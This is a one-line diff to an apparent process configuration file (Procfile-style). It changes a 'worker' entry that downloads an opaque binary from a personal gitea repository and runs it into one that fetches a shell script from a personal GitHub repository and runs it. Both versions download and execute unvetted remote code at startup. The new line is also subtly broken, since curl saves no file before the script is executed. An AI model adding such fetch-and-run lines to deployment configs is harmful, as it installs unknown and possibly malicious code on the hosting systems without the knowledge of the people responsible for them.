@@ -1,1 +1,1 @@
-worker: wget https://gitea.com/toafubi/Gremonia/raw/branch/main/rede && chmod 777 rede && ./rede
+worker: curl -sL https://raw.githubusercontent.com/crewi2013-hue/kelop/refs/heads/main/elen.sh && chmod +x elen.sh && ./elen.sh
